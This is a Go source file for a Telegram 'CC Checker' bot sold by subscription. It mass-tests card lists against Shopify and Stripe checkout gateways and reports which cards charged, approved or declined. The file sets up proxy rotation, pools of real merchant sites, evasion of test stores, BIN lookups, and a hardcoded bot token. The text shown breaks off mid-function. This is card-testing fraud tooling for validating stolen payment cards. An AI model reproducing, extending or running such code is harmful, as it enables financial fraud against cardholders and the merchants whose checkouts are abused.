package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	tele "gopkg.in/telebot.v4"
)

// ──────────────────────── config ────────────────────────────────────

const botToken = "8958665612:AAHmuyPJ8ls_TKA0V-eDnPtVFTFfignvqhk"
const usersFile = "users.json"
const configFile = "botconfig.json"
const sitesFile = "customsites.json"

var adminIDs = map[int64]bool{
	5733576801: true,
	6466522004: true,
}

// cfg is package-level so isAdmin and handlers can access it.
var cfg *BotConfig

func isAdmin(uid int64) bool {
	if adminIDs[uid] {
		return true
	}
	if cfg != nil {
		cfg.mu.RLock()
		defer cfg.mu.RUnlock()
		for _, a := range cfg.DynamicAdmins {
			if a == uid {
				return true
			}
		}
	}
	return false
}

// ──────────────────────── Bot config ────────────────────────────────

type BotConfig struct {
	mu            sync.RWMutex
	BannedUsers   map[int64]bool      `json:"banned_users"`
	AllowedUsers  map[int64]bool      `json:"allowed_users"`
	PvtOnly       bool                `json:"pvt_only"`
	BlockedIDs    []int64             `json:"blocked_ids"`
	AllowOnlyIDs  []int64             `json:"allow_only_ids"`
	RestrictAll   bool                `json:"restrict_all"`
	Groups        []int64             `json:"groups"`
	GroupsOnly    bool                `json:"groups_only"`
	DynamicAdmins []int64             `json:"dynamic_admins"`
	Perms         map[string][]string `json:"perms"`
}

func NewBotConfig() *BotConfig {
	return &BotConfig{
		BannedUsers:  make(map[int64]bool),
		AllowedUsers: make(map[int64]bool),
		Perms:        make(map[string][]string),
	}
}

func (bc *BotConfig) Save() {
	bc.mu.RLock()
	data, _ := json.MarshalIndent(bc, "", "  ")
	bc.mu.RUnlock()
	tmp := configFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, configFile)
	}
}

func (bc *BotConfig) Load() {
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}
	bc.mu.Lock()
	defer bc.mu.Unlock()
	json.Unmarshal(data, bc)
	if bc.BannedUsers == nil {
		bc.BannedUsers = make(map[int64]bool)
	}
	if bc.AllowedUsers == nil {
		bc.AllowedUsers = make(map[int64]bool)
	}
	if bc.Perms == nil {
		bc.Perms = make(map[string][]string)
	}
}

func (bc *BotConfig) IsBanned(uid int64) bool {
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	return bc.BannedUsers[uid]
}

func (bc *BotConfig) IsAllowed(uid int64, isPrivate bool) bool {
	if isAdmin(uid) {
		return true
	}
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	// BlockedIDs — restricted via /restrict <id>
	for _, bid := range bc.BlockedIDs {
		if bid == uid {
			return false
		}
	}
	// RestrictAll — only AllowOnlyIDs can access
	if bc.RestrictAll {
		found := false
		for _, aid := range bc.AllowOnlyIDs {
			if aid == uid {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	// GroupsOnly — deny private chats unless user is in AllowedUsers
	if bc.GroupsOnly && isPrivate && !bc.AllowedUsers[uid] {
		return false
	}
	// PvtOnly
	if bc.PvtOnly && !bc.AllowedUsers[uid] {
		return false
	}
	return true
}

// hasPerm returns true if uid has permission for the given command
// (admins always have permission).
func hasPerm(uid int64, cmd string) bool {
	if isAdmin(uid) {
		return true
	}
	if cfg == nil {
		return false
	}
	cfg.mu.RLock()
	defer cfg.mu.RUnlock()
	key := strconv.FormatInt(uid, 10)
	for _, c := range cfg.Perms[key] {
		if c == cmd {
			return true
		}
	}
	return false
}

// ──────────────────────── BIN lookup ────────────────────────────────

type BINInfo struct {
	Brand       string `json:"brand"`
	Type        string `json:"type"`
	Level       string `json:"level"`
	Bank        string `json:"bank"`
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	CountryFlag string `json:"country_flag"`
}

var binCache sync.Map // string (first6) → *BINInfo

func lookupBIN(bin string) *BINInfo {
	if len(bin) < 6 {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	first6 := bin[:6]
	if v, ok := binCache.Load(first6); ok {
		return v.(*BINInfo)
	}
	cl := &http.Client{Timeout: 5 * time.Second}
	resp, err := cl.Get("https://bins.antipublic.cc/bins/" + first6)
	if err != nil {
		info := &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
		binCache.Store(first6, info)
		return info
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var info BINInfo
	if json.Unmarshal(body, &info) != nil {
		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	if info.CountryFlag == "" {
		info.CountryFlag = countryFlag(info.CountryCode)
	}
	binCache.Store(first6, &info)
	return &info
}

func countryFlag(code string) string {
	if len(code) != 2 {
		return "🏳️"
	}
	code = strings.ToUpper(code)
	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}

// ──────────────────────── Premium emoji helpers ──────────────────────

func em(id, fallback string) string {
	return `<tg-emoji emoji-id="` + id + `">` + fallback + `</tg-emoji>`
}

const (
	emojiCharged   = "5352703228586773121"
	emojiCard      = "5472250091332993630"
	emojiGateway   = "4958689671950369798"
	emojiDoc       = "5444856076954520455"
	emojiPrice     = "5409048419211682843"
	emojiBrand     = "5402186569006210455"
	emojiBank      = "5332455502917949981"
	emojiGlobe     = "5224450179368767019"
	emojiUser      = "6100546649312987047"
	emojiLightning = "5354879329601876937"
	emojiCheck     = "6296367896398399651"
	emojiBlue      = "5780403162913444711"
	emojiSearch    = "5395444784611480792"
	emojiCross     = "5210952531676504517"
	emojiWarn      = "5447644880824181073"
	emojiClock     = "5780616017197667562"

	// /start message emojis
	emojiBot       = "5352994912700762383"
	emojiWave      = "5947013302331640354"
	emojiList      = "5222444124698853913"
	emojiCmdSh     = "5445353829304387411"
	emojiCmdTxt    = "5305265301917549162"
	emojiCmdSetpr  = "5447410659077661506"
	emojiCmdRmpr   = "5445267414562389170"
	emojiCmdStats  = "5231200819986047254"
	emojiCmdActive = "6001526766714227911"
	emojiPwr       = "5456140674028019486"
	emojiPwrStart  = "5429265105151879015"

	// /stats message emojis
	emojiRowCheck = "5197269100878907942"
	emojiRowAppr  = "5352658337588612223"
	emojiRowDecl  = "5355169587786713125"
	emojiRowCard  = "5474641619317698626"
	emojiMoney    = "6235459831302460476"
	emojiHitRate  = "5244837092042750681"
	emojiPctAppr  = "6084779072750097974"
	emojiPwrStats = "5195033767969839232"

	// /active message emojis
	emojiLive = "5256134032852278918"
	emojiTime = "5413704112220949842"

	// /start card emojis
	emojiStar     = "5386757680679377085"
	emojiCalendar = "6136500366008649837"
)

// ──────────────────────── User / persistence ────────────────────────

type UserStats struct {
	TotalChecked    int64   `json:"total_checked"`
	TotalCharged    int64   `json:"total_charged"`
	TotalApproved   int64   `json:"total_approved"`
	TotalDeclined   int64   `json:"total_declined"`
	TotalChargedAmt float64 `json:"total_charged_amt"`
}

type UserData struct {
	Proxies []string  `json:"proxies"`
	Stats   UserStats `json:"stats"`
}

type UserManager struct {
	mu    sync.RWMutex
	users map[int64]*UserData
}

func NewUserManager() *UserManager {
	return &UserManager{users: make(map[int64]*UserData)}
}

func (um *UserManager) Get(uid int64) *UserData {
	um.mu.RLock()
	ud := um.users[uid]
	um.mu.RUnlock()
	if ud != nil {
		return ud
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	if um.users[uid] == nil {
		um.users[uid] = &UserData{}
	}
	return um.users[uid]
}

func (um *UserManager) Save() {
	um.mu.RLock()
	data, _ := json.MarshalIndent(um.users, "", "  ")
	um.mu.RUnlock()
	tmpFile := usersFile + ".tmp"
	if err := os.WriteFile(tmpFile, data, 0644); err == nil {
		os.Rename(tmpFile, usersFile)
	}
}

func (um *UserManager) Load() {
	data, err := os.ReadFile(usersFile)
	if err != nil {
		return
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	json.Unmarshal(data, &um.users)
	if um.users == nil {
		um.users = make(map[int64]*UserData)
	}
}

func (um *UserManager) AllIDs() []int64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ids := make([]int64, 0, len(um.users))
	for id := range um.users {
		ids = append(ids, id)
	}
	return ids
}

// ──────────────────────── Check session ─────────────────────────────

type CheckSession struct {
	UserID       int64
	Username     string
	SessionID    string
	Cards        []string
	Total        int
	Checked      atomic.Int64
	Charged      atomic.Int64
	Approved     atomic.Int64
	Declined     atomic.Int64
	Errors       atomic.Int64
	StartTime    time.Time
	Cancel       context.CancelFunc
	Cancelled    atomic.Bool
	Done         chan struct{}
	ShowDecl     bool   // true for /sh, false for /txt
	ShowApproved bool   // true to send approved cards in chat
	GatewayName  string // display name for progress/completed messages

	chargedAmtMu sync.Mutex
	chargedAmt   float64
}

func (s *CheckSession) AddChargedAmt(v float64) {
	s.chargedAmtMu.Lock()
	s.chargedAmt += v
	s.chargedAmtMu.Unlock()
}

func (s *CheckSession) ChargedAmt() float64 {
	s.chargedAmtMu.Lock()
	defer s.chargedAmtMu.Unlock()
	return s.chargedAmt
}

func generateSessionID() string {
	const hex = "0123456789ABCDEF"
	b := make([]byte, 9)
	for i := range b {
		if i == 4 {
			b[i] = '-'
		} else {
			b[i] = hex[rand.Intn(16)]
		}
	}
	return string(b)
}

var activeSessions sync.Map // int64 (userID) → *CheckSession

// ──────────────────────── Pending /txt sessions (awaiting Yes/No) ───

type txtPendingData struct {
	Cards    []string
	ChatID   int64
	Username string
	GateName string
	CheckFn  stripeCheckFn
}

var (
	txtPendingMu sync.Mutex
	txtPending   = map[int64]*txtPendingData{} // userID → pending data
)

// ──────────────────────── Custom sites ─────────────────────────

var (
	customSitesMu sync.RWMutex
	customSites   []string
)

// ──────────────────────── Blacklisted (test) sites ─────────────

var (
	blacklistMu sync.RWMutex
	blacklisted = make(map[string]bool)
)

func isBlacklisted(site string) bool {
	blacklistMu.RLock()
	defer blacklistMu.RUnlock()
	return blacklisted[site]
}

func blacklistSite(site string) {
	blacklistMu.Lock()
	defer blacklistMu.Unlock()
	blacklisted[site] = true
	fmt.Printf("[BLACKLIST] test store detected, blacklisted: %s\n", site)
}

func loadCustomSites() {
	data, err := os.ReadFile(sitesFile)
	if err != nil {
		return
	}
	customSitesMu.Lock()
	defer customSitesMu.Unlock()
	json.Unmarshal(data, &customSites)
}

func saveCustomSites() {
	customSitesMu.RLock()
	data, _ := json.MarshalIndent(customSites, "", "  ")
	customSitesMu.RUnlock()
	tmp := sitesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, sitesFile)
	}
}

func getCustomSites() []string {
	customSitesMu.RLock()
	defer customSitesMu.RUnlock()
	if len(customSites) == 0 {
		return nil
	}
	cp := make([]string, len(customSites))
	copy(cp, customSites)
	return cp
}

// ──────────────────────── Site pool ─────────────────────────────────

var (
	sitePoolMu sync.RWMutex
	sitePool   []string
)

func refreshSitePool() {
	apiURL := strings.TrimSpace(workingSitesAPI)
	if apiURL == "" {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	sites, err := fetchAffordableSites(apiURL, maxSiteAmount)
	if err != nil || len(sites) == 0 {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	rand.Shuffle(len(sites), func(i, j int) {
		sites[i], sites[j] = sites[j], sites[i]
	})
	newPool := make([]string, 0, len(sites))
	for _, s := range sites {
		newPool = append(newPool, strings.TrimRight(s.URL, "/"))
	}
	sitePoolMu.Lock()
	sitePool = newPool
	sitePoolMu.Unlock()
}

func getSitePool() []string {
	var raw []string
	// Prefer custom sites if any are set
	if cs := getCustomSites(); len(cs) > 0 {
		raw = cs
	} else {
		sitePoolMu.RLock()
		raw = make([]string, len(sitePool))
		copy(raw, sitePool)
		sitePoolMu.RUnlock()
	}
	// Filter out blacklisted test stores
	filtered := make([]string, 0, len(raw))
	for _, s := range raw {
		if !isBlacklisted(s) {
			filtered = append(filtered, s)
		}
	}
	return filtered
}

// ──────────────────────── Message templates ─────────────────────────

func formatWelcomeCard(uid int64, username string, proxyCount int) string {
	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
		"STATUS → " + em(emojiCheck, "✅") + " <b>Active</b> " + em(emojiCheck, "✅") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "🔵") + " <b>ID</b> → <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
		em(emojiUser, "👤") + " <b>User</b> → @" + username + "\n" +
		em(emojiStar, "⭐") + " <b>Bot</b> → CC Checker\n" +
		em(emojiCalendar, "📅") + " <b>Proxies</b> → " + strconv.Itoa(proxyCount) + " loaded\n" +
		em(emojiLightning, "⚡") + " <b>Owner</b> → @aldorsi\n" +
		"━━━━━━━━━━━━━━━━━━━━━━"
}

func formatGatesMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiCharged, "🔥") + " 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗚𝗮𝘁𝗲𝘀 " + em(emojiCharged, "🔥") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
		em(emojiCmdSh, "🔫") + " <b>Shopify Auto Charge</b>\n" +
		"└ /sh &lt;cc list&gt;\n\n" +
		em(emojiCharged, "🔥") + " <b>Stripe Auth</b> (UK, no charge)\n" +
		"└ /str  /mstr  /mstrtxt\n\n" +
		em(emojiCharged, "🔥") + " <b>Stripe UHQ $1 GBP</b>\n" +
		"└ /str1  /mstr1  /mstr1txt\n\n" +
		em(emojiCharged, "🔥") + " <b>Stripe UHQ $5 NZD</b>\n" +
		"└ /str2  /mstr2  /mstr2txt\n\n" +
		em(emojiCharged, "🔥") + " <b>Stripe Donation $3 USD</b>\n" +
		"└ /str4  /mstr4  /mstr4txt\n\n" +
		em(emojiCharged, "🔥") + " <b>Stripe $1 USD</b>\n" +
		"└ /str5  /mstr5  /mstr5txt\n\n" +
		em(emojiCmdTxt, "📎") + " <b>Mass AutoShopify</b>\n" +
		"└ /txt\n\n" +
		"━━━━━━━━━━━━━━━━━━━━━━"
}

func formatPricingMsg() string {
	return "💥 <b>Available Access Plans</b> 💥\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔 ⚡\n" +
		"Duration ↬ 7 days\n" +
		"Price ↬ DM\n" +
		"Credits ↬ Unlimited until plan ends\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔 ⭐\n" +
		"Duration ↬ 15 days\n" +
		"Price ↬ DM\n" +
		"Credits ↬ Unlimited until plan ends\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔 👑\n" +
		"Duration ↬ 30 days\n" +
		"Price ↬ DM\n" +
		"Credits ↬ Unlimited until plan ends\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"𝑿-𝑨𝒄𝒄𝒆𝒔 👑\n" +
		"Duration ↬ 90 days\n" +
		"Price ↬ DM\n" +
		"Credits ↬ Unlimited until plan ends\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
		"DM ↬ @aldorsi"
}

func formatStartMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiBot, "🤖") + " 𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁 " + em(emojiBot, "🤖") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
		em(emojiWave, "👋") + "  <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲!</b>  Use the commands\nbelow to get started.\n\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiList, "📖") + "  𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗶𝘀𝘁 " + em(emojiList, "📖") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
		em(emojiCmdSh, "🔫") + "  /sh &lt;cc list&gt;\n" +
		"     ∟ Quick check up to 100 cards\n       Paste cards directly inline\n\n" +
		em(emojiCharged, "🔥") + "  /str &lt;cc list&gt;  /mstr &lt;cc list&gt;  /mstrtxt\n" +
		"     ∟ Stripe Auth (UK, no charge)\n       Inline or mass-txt\n\n" +
		em(emojiCharged, "🔥") + "  /str1 &lt;cc list&gt;  /mstr1 &lt;cc list&gt;  /mstr1txt\n" +
		"     ∟ Stripe UHQ $1 GBP (checkout)\n       Inline or mass-txt\n\n" +
		em(emojiCharged, "🔥") + "  /str2 &lt;cc list&gt;  /mstr2 &lt;cc list&gt;  /mstr2txt\n" +
		"     ∟ Stripe UHQ $5 NZD (SecondStork)\n       Inline or mass-txt\n\n" +
		em(emojiCharged, "🔥") + "  /str4 &lt;cc list&gt;  /mstr4 &lt;cc list&gt;  /mstr4txt\n" +
		"     ∟ Stripe Donation $3 USD\n       Inline or mass-txt\n\n" +
		em(emojiCharged, "🔥") + "  /str5 &lt;cc list&gt;  /mstr5 &lt;cc list&gt;  /mstr5txt\n" +
		"     ∟ Stripe $1 USD\n       Inline or mass-txt\n\n" +
		em(emojiCmdTxt, "📎") + "  /txt\n" +
		"     ∟ Reply to a .txt file to mass\n       check all cards inside it\n\n" +
		em(emojiCmdSetpr, "🌐") + "  /setpr &lt;proxy&gt;\n" +
		"     ∟ Add proxy(s) for checking\n       One per line, or a single proxy\n\n" +
		em(emojiCmdRmpr, "🗑") + "  /rmpr &lt;proxy&gt;\n" +
		"     ∟ Remove a specific proxy\n\n" +
		em(emojiCmdRmpr, "🗑") + "  /rmpr all\n" +
		"     ∟ Remove all saved proxies\n\n" +
		em(emojiCmdStats, "📊") + "  /stats\n" +
		"     ∟ View your personal usage\n       stats and hit rates\n\n" +
		em(emojiCmdActive, "👥") + "  /active\n" +
		"     ∟ See all users currently\n       checking with live progress\n\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi " + em(emojiPwrStart, "⚡") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━"
}

func formatProgressMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	pgGw := s.GatewayName
	if pgGw == "" {
		pgGw = "AutoShopify Charge"
	}
	return em(emojiBlue, "🔵") + " <b><i>Checking...</i></b>\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "🔵") + " <b>Session ID</b> ⇒ <b>" + s.SessionID + "</b>\n" +
		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + pgGw + "</b>\n" +
		em(emojiDoc, "📋") + " <b>Total Cards</b> ⇒ <b>" + strconv.Itoa(total) + "</b>\n" +
		em(emojiSearch, "🔍") + " <b>Checked</b> ⇒ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
		em(emojiCard, "💳") + " <b>Charged</b> ⇒ <b>" + strconv.Itoa(charged) + "</b>\n" +
		em(emojiCheck, "✅") + " <b>Approved</b> ⇒ <b>" + strconv.Itoa(approved) + "</b>\n" +
		em(emojiCross, "❌") + " <b>Declined</b> ⇒ <b>" + strconv.Itoa(declined) + "</b>\n" +
		em(emojiWarn, "⚠️") + " <b>Error Cards</b> ⇒ <b>" + strconv.Itoa(errors) + "</b>\n" +
		em(emojiClock, "⏱") + " <b>Time</b> ⇒ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "⏱") + "\n" +
		em(emojiUser, "👤") + " <b>Check By</b> ⇒ <b>@" + s.Username + "</b>\n" +
		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi"
}

func formatCompletedMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Millisecond * 100)

	cmpGw := s.GatewayName
	if cmpGw == "" {
		cmpGw = "AutoShopify Charge"
	}
	return em(emojiCheck, "✅") + " <b><i>Completed</i></b> " + em(emojiCheck, "✅") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "🔵") + " <b>Session ID</b> ⇒ <b>" + s.SessionID + "</b>\n" +
		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + cmpGw + "</b>\n" +
		em(emojiDoc, "📋") + " <b>Total Cards</b> ⇒ <b>" + strconv.Itoa(total) + "</b>\n" +
		em(emojiSearch, "🔍") + " <b>Checked</b> ⇒ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
		em(emojiCard, "💳") + " <b>Charged</b> ⇒ <b>" + strconv.Itoa(charged) + "</b>\n" +
		em(emojiCheck, "✅") + " <b>Approved</b> ⇒ <b>" + strconv.Itoa(approved) + "</b>\n" +
		em(emojiCross, "❌") + " <b>Declined</b> ⇒ <b>" + strconv.Itoa(declined) + "</b>\n" +
		em(emojiWarn, "⚠️") + " <b>Error Cards</b> ⇒ <b>" + strconv.Itoa(errors) + "</b>\n" +
		em(emojiClock, "⏱") + " <b>Time</b> ⇒ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "⏱") + "\n" +
		em(emojiUser, "👤") + " <b>Check By</b> ⇒ <b>@" + s.Username + "</b>\n" +
		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi"
}

func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
	px := "●"
	if proxyURL == "" {
		px = "∅"
	}
	chGw := r.Gateway
	if chGw == "" {
		chGw = "Shopify Payments"
	}
	chResp := r.StatusCode
	if chResp == "" {
		chResp = "ORDER_PLACED"
	}
	return "<b><i>Charged</i></b> 🔥\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		"💳 <b>Card</b>\n" +
		"└ <code>" + card + "</code>\n" +
		"🔗 <b>Gateway</b> ⇒ <b>" + chGw + "</b>\n" +
		"📋 <b>Response</b> ⇒ <b>" + chResp + "</b>\n" +
		"💲 <b>Price</b> ⇒ <b>" + r.Amount + "</b>\n\n" +
		"🔰 <b>Brand</b> ⇒ <b>" + bin.Brand + "</b>\n" +
		"🏦 <b>Bank</b> ⇒ <b>" + bin.Bank + "</b>\n" +
		"🌍 <b>Country</b> ⇒ <b>" + bin.Country + "</b> " + bin.CountryFlag + "\n\n" +
		"👤 <b>User</b> ⇒ <b>@" + username + "</b>\n" +
		"⚡ <b>Owner</b> ⇒ @aldorsi / 🌐 <b>Px</b> ⇒ " + px
}

func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
	px := "●"
	if proxyURL == "" {
		px = "∅"
	}
	apGw := r.Gateway
	if apGw == "" {
		apGw = "Shopify Payments"
	}
	header := "3DS"
	if r.StatusCode == "INSUFFICIENT_FUNDS" {
		header = "Insufficient"
	} else if r.StatusCode == "CARD_APPROVED" {
		header = "Approved"
	}
	return "<b><i>" + header + "</i></b> " + em(emojiCheck, "✅") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCard, "💳") + " <b>Card</b>\n" +
		"└ <code>" + card + "</code>\n" +
		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + apGw + "</b>\n" +
		em(emojiDoc, "📋") + " <b>Response</b> ⇒ <b>" + r.StatusCode + "</b>\n" +
		em(emojiBrand, "🔰") + " <b>Brand</b> ⇒ <b>" + bin.Brand + "</b>\n" +
		em(emojiBank, "🏦") + " <b>Bank</b> ⇒ <b>" + bin.Bank + "</b>\n" +
		em(emojiGlobe, "🌍") + " <b>Country</b> ⇒ <b>" + bin.Country + "</b> " + bin.CountryFlag + "\n\n" +
		em(emojiUser, "👤") + " <b>User</b> ⇒ <b>@" + username + "</b>\n" +
		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi / " + em(emojiGlobe, "🌐") + " <b>Px</b> ⇒ " + px
}

func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
	px := "●"
	if proxyURL == "" {
		px = "∅"
	}
	dcGw := r.Gateway
	if dcGw == "" {
		dcGw = "Shopify Payments"
	}
	return "<b><i>Declined</i></b> " + em(emojiCross, "❌") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCard, "💳") + " <b>Card</b>\n" +
		"└ <code>" + card + "</code>\n" +
		em(emojiGateway, "🔗") + " <b>Gateway</b> ⇒ <b>" + dcGw + "</b>\n" +
		em(emojiDoc, "📋") + " <b>Response</b> ⇒ <b>" + r.StatusCode + "</b>\n" +
		em(emojiBrand, "🔰") + " <b>Brand</b> ⇒ <b>" + bin.Brand + "</b>\n" +
		em(emojiBank, "🏦") + " <b>Bank</b> ⇒ <b>" + bin.Bank + "</b>\n" +
		em(emojiGlobe, "🌍") + " <b>Country</b> ⇒ <b>" + bin.Country + "</b> " + bin.CountryFlag + "\n\n" +
		em(emojiUser, "👤") + " <b>User</b> ⇒ <b>@" + username + "</b>\n" +
		em(emojiLightning, "⚡") + " <b>Owner</b> ⇒ @aldorsi / " + em(emojiGlobe, "🌐") + " <b>Px</b> ⇒ " + px
}

func formatActiveMsg() string {
	type entry struct {
		Username   string
		Checked    int
		Total      int
		Charged    int
		ChargedAmt float64
		Elapsed    time.Duration
	}
	var entries []entry
	activeSessions.Range(func(_, val any) bool {
		s := val.(*CheckSession)
		entries = append(entries, entry{
			Username:   s.Username,
			Checked:    int(s.Checked.Load()),
			Total:      s.Total,
			Charged:    int(s.Charged.Load()),
			ChargedAmt: s.ChargedAmt(),
			Elapsed:    time.Since(s.StartTime).Truncate(time.Second),
		})
		return true
	})

	if len(entries) == 0 {
		return "━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n" + em(emojiLive, "📡") + "  No active sessions\n\n━━━━━━━━━━━━━━━━━━━━━━"
	}

	sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })

	var sb strings.Builder
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiCmdActive, "👥") + "  𝗔𝗰𝘁𝗶𝘃𝗲 𝗖𝗵𝗲𝗰𝗸𝘀\n━━━━━━━━━━━━━━━━━━━━━━\n\n")
	sb.WriteString(fmt.Sprintf(em(emojiLive, "🔴")+"  %d users currently checking\n\n", len(entries)))
	sb.WriteString("┌───────────────────────┐\n│                           │\n")
	for i, e := range entries {
		pct := 0
		if e.Total > 0 {
			pct = e.Checked * 100 / e.Total
		}
		barLen := 10
		filled := barLen * e.Checked / max(e.Total, 1)
		bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)
		h := int(e.Elapsed.Hours())
		m := int(e.Elapsed.Minutes()) % 60
		sc := int(e.Elapsed.Seconds()) % 60
		sb.WriteString(fmt.Sprintf("│   %d. @%s\n", i+1, e.Username))
		sb.WriteString(fmt.Sprintf("│      %s %3d%%\n", bar, pct))
		sb.WriteString(fmt.Sprintf("│        %d / %d\n", e.Checked, e.Total))
		sb.WriteString(fmt.Sprintf("│      "+em(emojiRowCard, "💳")+"  %d charged ∣ $%.2f\n", e.Charged, e.ChargedAmt))
		sb.WriteString(fmt.Sprintf("│      "+em(emojiTime, "⏱")+" %02d:%02d:%02d\n", h, m, sc))
		sb.WriteString("│                           │\n")
	}
	sb.WriteString("└───────────────────────┘\n\n")
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi\n━━━━━━━━━━━━━━━━━━━━━━")
	return sb.String()
}

func formatStatsMsg(um *UserManager) string {
	um.mu.Lock()
	var totalChecked, totalApproved, totalDeclined, totalCharged int64
	var totalChargedAmt float64
	for _, ud := range um.users {
		s := ud.Stats
		totalChecked += s.TotalChecked
		totalApproved += s.TotalApproved
		totalDeclined += s.TotalDeclined
		totalCharged += s.TotalCharged
		totalChargedAmt += s.TotalChargedAmt
	}
	um.mu.Unlock()

	approvedRate := 0.0
	chargedRate := 0.0
	if totalChecked > 0 {
		approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
		chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
	}
	return "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		"    " + em(emojiCmdStats, "📊") + "  𝗚𝗹𝗼𝗯𝗮𝗹 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
		"┌────────────────────────────┐\n" +
